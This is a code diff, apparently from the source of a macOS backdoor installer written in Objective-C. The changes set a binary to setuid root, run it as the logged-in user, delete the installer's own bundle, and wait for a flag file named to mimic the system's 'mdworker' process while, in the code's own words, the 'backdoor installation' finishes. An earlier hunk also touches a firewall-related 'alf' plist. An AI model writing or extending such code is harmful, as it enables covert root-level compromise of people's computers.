@@ -91,6 +91,9 @@ void restoreAlfPlist()
                         toPath: destAlfPlistPath
                          error: nil];
 
+  u_long permissions  = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+  changeAttributesForBinaryAtPath(destAlfPlistPath, 0, 0, permissions);
+
   [alfPlistPath release];
   [destAlfPlistPath release];
 }
@@ -210,34 +213,15 @@ int main(int ac, char *av[])
   [binary release];
   [destinationDir release];
 
-  NSArray *arguments = [NSArray arrayWithObjects: @"-R",
-                        @"root:wheel",
-                        binaryPath,
-                        nil];
-  executeTask(@"/usr/sbin/chown", arguments, YES);
- 
-  //
-  // suid binary
-  //
   u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
-  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
-  NSValue *owner      = [NSNumber numberWithInt: 0];
+  changeAttributesForBinaryAtPath(binaryPath, 0, 0, permissions);
 
-  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
-                                  permission,
-                                  NSFilePosixPermissions,
-                                  owner,
-                                  NSFileOwnerAccountID,
-                                  nil];
+  arguments = [NSArray arrayWithObjects:
+    @"-u",
+    username,
+    binaryPath,
+    nil];
 
-  [_fileManager setAttributes: tempDictionary
-                 ofItemAtPath: binaryPath
-                        error: nil];
-
-  arguments = [NSArray arrayWithObjects: @"-u",
-               username,
-               binaryPath,
-               nil];
   //
   // Execute it as the user
   //
@@ -249,6 +233,25 @@ int main(int ac, char *av[])
   [_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                            error: nil];
 
+  //
+  // Wait for backdoor installation
+  //
+  NSString *workerFlagPath = [[NSString alloc] initWithFormat:
+    @"%@/mdworker.flg",
+    destinationDir];
+
+  while ([_fileManager fileExistsAtPath: workerFlagPath] == NO)
+    {
+      sleep(1);
+    }
+
+  //
+  // Wait just to be sure (if we exit before the child process
+  // has finished we might force-kill it)
+  //
+  sleep(5);
+
+  [workerFlagPath release];
   [username release];
   [binaryPath release];
   [outerPool release];
